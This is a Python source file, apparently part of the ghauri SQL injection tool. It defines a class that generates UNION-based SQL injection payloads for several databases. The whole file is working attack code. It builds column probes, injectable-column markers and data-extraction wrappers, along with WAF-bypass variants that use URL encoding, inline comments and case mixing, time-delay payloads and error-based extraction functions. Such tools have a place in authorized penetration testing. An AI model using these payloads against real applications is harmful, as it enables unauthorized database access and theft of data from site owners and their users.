#!/usr/bin/python3
# -*- coding: utf-8 -*-
# pylint: disable=R,W,E,C

"""
 Union Payload Generator


This module provides  union payload generation with
database-specific optimizations and bypass techniques.
"""

import random
from typing import List, Dict, Optional
from ghauri.logger.colored_logger import logger


class UnionPayloadGenerator:
    """Union payload generator with database-specific optimizations"""
    
    def __init__(self):
        self.null_alternatives = {
            'mysql': ['NULL', '0', "''", 'CHAR(32)', 'SPACE(1)', '0x00'],
            'postgresql': ['NULL', '0', "''", 'CHR(32)', "' '"],
            'mssql': ['NULL', '0', "''", 'CHAR(32)', "' '", 'SPACE(1)'],
            'oracle': ['NULL', "''", 'CHR(32)', "' '"],
            'sqlite': ['NULL', '0', "''", "' '"],
            'generic': ['NULL', '0', "''"]
        }
        
        self.union_keywords = {
            'standard': ['UNION', 'UNION ALL'],
            'bypass': [
                'UNION/**/SELECT', 'UNION/*comment*/SELECT',
                'UNION+SELECT', 'UNION%20SELECT', 'UNION%09SELECT',
                'UNION%0ASELECT', 'UNION%0DSELECT', 'UNION%0D%0ASELECT',
                'UNION%A0SELECT', 'UNION%C2%A0SELECT',
                '/*!UNION*/SELECT', '/*!50000UNION*/SELECT',
                'UNION/*!SELECT*/', 'UNION+ALL+SELECT'
            ]
        }
        
        self.comment_styles = {
            'mysql': ['--', '-- ', '#', '/*comment*/', '/*!comment*/'],
            'postgresql': ['--', '-- ', '/*comment*/'],
            'mssql': ['--', '-- ', '/*comment*/'],
            'oracle': ['--', '-- ', '/*comment*/'],
            'sqlite': ['--', '-- ', '/*comment*/'],
            'generic': ['--', '-- ']
        }
    
    def generate_basic_union_payloads(self, column_count: int, dbms: str = 'generic',
                                    use_bypass: bool = False) -> List[str]:
        """
        Generate basic UNION SELECT payloads
        
        Args:
            column_count: Number of columns
            dbms: Database management system
            use_bypass: Whether to use bypass techniques
            
        Returns:
            List of UNION SELECT payloads
        """
        payloads = []
        dbms = dbms.lower() if dbms else 'generic'
        
        # Get appropriate NULL alternatives
        null_alts = self.null_alternatives.get(dbms, self.null_alternatives['generic'])
        
        # Get union keywords
        union_keywords = self.union_keywords['bypass'] if use_bypass else self.union_keywords['standard']
        
        # Get comment styles
        comments = self.comment_styles.get(dbms, self.comment_styles['generic'])
        
        for union_keyword in union_keywords:
            for comment in comments:
                # Standard NULL payload
                null_columns = ','.join(['NULL'] * column_count)
                
                if dbms == 'oracle':
                    payload = f"{union_keyword} {null_columns} FROM DUAL{comment}"
                else:
                    payload = f"{union_keyword} {null_columns}{comment}"
                
                payloads.append(payload)
                
                # Mixed NULL alternatives
                if len(null_alts) > 1:
                    mixed_columns = []
                    for i in range(column_count):
                        mixed_columns.append(random.choice(null_alts))
                    mixed_payload = ','.join(mixed_columns)
                    
                    if dbms == 'oracle':
                        payload = f"{union_keyword} {mixed_payload} FROM DUAL{comment}"
                    else:
                        payload = f"{union_keyword} {mixed_payload}{comment}"
                    
                    payloads.append(payload)
        
        return payloads
    
    def generate_detection_payloads(self, column_count: int, marker_position: int,
                                  marker_value: str, dbms: str = 'generic') -> List[str]:
        """
        Generate payloads for detecting injectable columns
        
        Args:
            column_count: Number of columns
            marker_position: Position to place marker (1-based)
            marker_value: Value to use as marker
            dbms: Database management system
            
        Returns:
            List of detection payloads
        """
        payloads = []
        dbms = dbms.lower() if dbms else 'generic'
        
        null_alts = self.null_alternatives.get(dbms, self.null_alternatives['generic'])
        comments = self.comment_styles.get(dbms, self.comment_styles['generic'])
        
        for comment in comments:
            columns = []
            
            for i in range(1, column_count + 1):
                if i == marker_position:
                    # Add marker with different formats
                    marker_formats = [
                        f"'{marker_value}'",
                        f"{marker_value}",
                        f"CONCAT('{marker_value}')",
                        f"CAST('{marker_value}' AS CHAR)"
                    ]
                    
                    if dbms == 'mysql':
                        marker_formats.extend([
                            f"UNHEX(HEX('{marker_value}'))",
                            f"CHAR({','.join(str(ord(c)) for c in marker_value)})"
                        ])
                    elif dbms == 'postgresql':
                        marker_formats.extend([
                            f"CHR({ord(marker_value[0])})||'{marker_value[1:]}'",
                            f"'{marker_value}'::text"
                        ])
                    elif dbms == 'oracle':
                        marker_formats.extend([
                            f"CHR({ord(marker_value[0])})||'{marker_value[1:]}'",
                            f"TO_CHAR('{marker_value}')"
                        ])
                    
                    columns.append(random.choice(marker_formats))
                else:
                    columns.append(random.choice(null_alts))
            
            column_list = ','.join(columns)
            
            if dbms == 'oracle':
                payload = f"UNION SELECT {column_list} FROM DUAL{comment}"
            else:
                payload = f"UNION SELECT {column_list}{comment}"
            
            payloads.append(payload)
        
        return payloads
    
    def generate_extraction_payloads(self, column_count: int, injectable_columns: List[int],
                                   extraction_query: str, dbms: str = 'generic') -> List[str]:
        """
        Generate payloads for data extraction
        
        Args:
            column_count: Number of columns
            injectable_columns: List of injectable column positions
            extraction_query: SQL query to extract data
            dbms: Database management system
            
        Returns:
            List of extraction payloads
        """
        if not injectable_columns:
            return []
        
        payloads = []
        dbms = dbms.lower() if dbms else 'generic'
        
        null_alts = self.null_alternatives.get(dbms, self.null_alternatives['generic'])
        comments = self.comment_styles.get(dbms, self.comment_styles['generic'])
        
        # Use first injectable column for extraction
        extraction_column = injectable_columns[0]
        
        for comment in comments:
            columns = []
            
            for i in range(1, column_count + 1):
                if i == extraction_column:
                    # Format extraction query based on DBMS
                    if dbms == 'mysql':
                        formatted_query = f"CONCAT('START:',({extraction_query}),'END')"
                    elif dbms == 'postgresql':
                        formatted_query = f"'START:'||({extraction_query})||'END'"
                    elif dbms == 'mssql':
                        formatted_query = f"'START:'+CAST(({extraction_query}) AS VARCHAR)+'END'"
                    elif dbms == 'oracle':
                        formatted_query = f"'START:'||TO_CHAR(({extraction_query}))||'END'"
                    else:
                        formatted_query = f"({extraction_query})"
                    
                    columns.append(formatted_query)
                else:
                    columns.append(random.choice(null_alts))
            
            column_list = ','.join(columns)
            
            if dbms == 'oracle':
                payload = f"UNION SELECT {column_list} FROM DUAL{comment}"
            else:
                payload = f"UNION SELECT {column_list}{comment}"
            
            payloads.append(payload)
        
        return payloads
    
    def generate_bypass_payloads(self, column_count: int, dbms: str = 'generic') -> List[str]:
        """
        Generate WAF bypass payloads
        
        Args:
            column_count: Number of columns
            dbms: Database management system
            
        Returns:
            List of bypass payloads
        """
        payloads = []
        dbms = dbms.lower() if dbms else 'generic'
        
        null_alts = self.null_alternatives.get(dbms, self.null_alternatives['generic'])
        
        # Case variation bypasses
        case_variations = [
            'UNION SELECT', 'union select', 'Union Select',
            'UnIoN sElEcT', 'UNION/**/SELECT', 'union/**/select'
        ]
        
        # Encoding bypasses
        encoding_bypasses = [
            'UNION%20SELECT', 'UNION%09SELECT', 'UNION%0ASELECT',
            'UNION%0DSELECT', 'UNION%A0SELECT', 'UNION+SELECT'
        ]
        
        # Comment bypasses
        comment_bypasses = [
            'UNION/*comment*/SELECT', 'UNION/*!SELECT*/',
            'UNION/**/SELECT/**/NULL', 'UNION#comment\nSELECT'
        ]
        
        all_bypasses = case_variations + encoding_bypasses + comment_bypasses
        
        for bypass in all_bypasses:
            null_columns = ','.join([random.choice(null_alts) for _ in range(column_count)])
            
            if dbms == 'oracle':
                payload = f"{bypass} {null_columns} FROM DUAL--"
            else:
                payload = f"{bypass} {null_columns}--"
            
            payloads.append(payload)
        
        # Database-specific bypasses
        if dbms == 'mysql':
            mysql_bypasses = [
                f"UNION/*!50000SELECT*/ {','.join(['NULL']*column_count)}--",
                f"/*!UNION*//*!SELECT*/ {','.join(['NULL']*column_count)}--",
                f"UNION(SELECT({','.join(['NULL']*column_count)}))--"
            ]
            payloads.extend(mysql_bypasses)
        
        elif dbms == 'mssql':
            mssql_bypasses = [
                f"UNION[SELECT] {','.join(['NULL']*column_count)}--",
                f"UNION%20SELECT%20{','.join(['NULL']*column_count)}--"
            ]
            payloads.extend(mssql_bypasses)
        
        return payloads
    
    def generate_time_based_union_payloads(self, column_count: int, delay_seconds: int = 5,
                                         dbms: str = 'generic') -> List[str]:
        """
        Generate time-based union payloads for blind detection
        
        Args:
            column_count: Number of columns
            delay_seconds: Delay in seconds
            dbms: Database management system
            
        Returns:
            List of time-based payloads
        """
        payloads = []
        dbms = dbms.lower() if dbms else 'generic'
        
        null_alts = self.null_alternatives.get(dbms, self.null_alternatives['generic'])
        
        # Database-specific time delay functions
        time_functions = {
            'mysql': [f"SLEEP({delay_seconds})", f"BENCHMARK(5000000,MD5(1))"],
            'postgresql': [f"PG_SLEEP({delay_seconds})"],
            'mssql': [f"WAITFOR DELAY '00:00:{delay_seconds:02d}'"],
            'oracle': [f"DBMS_LOCK.SLEEP({delay_seconds})"],
            'sqlite': [f"RANDOMBLOB({delay_seconds}000000)"],
            'generic': [f"SLEEP({delay_seconds})"]
        }
        
        delay_funcs = time_functions.get(dbms, time_functions['generic'])
        
        for delay_func in delay_funcs:
            columns = []
            
            # Place time function in first column
            columns.append(delay_func)
            
            # Fill remaining columns with NULLs
            for i in range(1, column_count):
                columns.append(random.choice(null_alts))
            
            column_list = ','.join(columns)
            
            if dbms == 'oracle':
                payload = f"UNION SELECT {column_list} FROM DUAL--"
            else:
                payload = f"UNION SELECT {column_list}--"
            
            payloads.append(payload)
        
        return payloads
    
    def generate_error_based_union_payloads(self, column_count: int,
                                          dbms: str = 'generic') -> List[str]:
        """
        Generate error-based union payloads
        
        Args:
            column_count: Number of columns
            dbms: Database management system
            
        Returns:
            List of error-based payloads
        """
        payloads = []
        dbms = dbms.lower() if dbms else 'generic'
        
        null_alts = self.null_alternatives.get(dbms, self.null_alternatives['generic'])
        
        # Database-specific error functions
        error_functions = {
            'mysql': [
                "EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))",
                "UPDATEXML(1,CONCAT(0x7e,USER(),0x7e),1)",
                "EXP(~(SELECT*FROM(SELECT USER())x))"
            ],
            'postgresql': [
                "CAST(VERSION() AS INT)",
                "CAST(USER AS INT)",
                "1/0"
            ],
            'mssql': [
                "CONVERT(INT,@@VERSION)",
                "CAST(@@VERSION AS INT)",
                "1/0"
            ],
            'oracle': [
                "CTXSYS.DRITHSX.SN(USER,(CHR(39)))",
                "ORDSYS.ORD_DICOM.GETMAPPINGXPATH(USER,CHR(39))",
                "UTL_INADDR.GET_HOST_NAME(CHR(39)||USER||CHR(39))"
            ],
            'generic': ["1/0", "CAST(USER() AS INT)"]
        }
        
        error_funcs = error_functions.get(dbms, error_functions['generic'])
        
        for error_func in error_funcs:
            columns = []
            
            # Place error function in first column
            columns.append(error_func)
            
            # Fill remaining columns with NULLs
            for i in range(1, column_count):
                columns.append(random.choice(null_alts))
            
            column_list = ','.join(columns)
            
            if dbms == 'oracle':
                payload = f"UNION SELECT {column_list} FROM DUAL--"
            else:
                payload = f"UNION SELECT {column_list}--"
            
            payloads.append(payload)
        
        return payloads
    
    def get_optimized_payloads(self, column_count: int, dbms: str = 'generic',
                             payload_type: str = 'basic', **kwargs) -> List[str]:
        """
        Get optimized payloads based on type and database
        
        Args:
            column_count: Number of columns
            dbms: Database management system
            payload_type: Type of payload (basic, detection, extraction, bypass, time, error)
            **kwargs: Additional arguments for specific payload types
            
        Returns:
            List of optimized payloads
        """
        if payload_type == 'basic':
            return self.generate_basic_union_payloads(column_count, dbms, kwargs.get('use_bypass', False))
        elif payload_type == 'detection':
            return self.generate_detection_payloads(
                column_count, kwargs.get('marker_position', 1),
                kwargs.get('marker_value', 'test'), dbms
            )
        elif payload_type == 'extraction':
            return self.generate_extraction_payloads(
                column_count, kwargs.get('injectable_columns', [1]),
                kwargs.get('extraction_query', 'VERSION()'), dbms
            )
        elif payload_type == 'bypass':
            return self.generate_bypass_payloads(column_count, dbms)
        elif payload_type == 'time':
            return self.generate_time_based_union_payloads(
                column_count, kwargs.get('delay_seconds', 5), dbms
            )
        elif payload_type == 'error':
            return self.generate_error_based_union_payloads(column_count, dbms)
        else:
            logger.warning(f"Unknown payload type: {payload_type}")
            return self.generate_basic_union_payloads(column_count, dbms)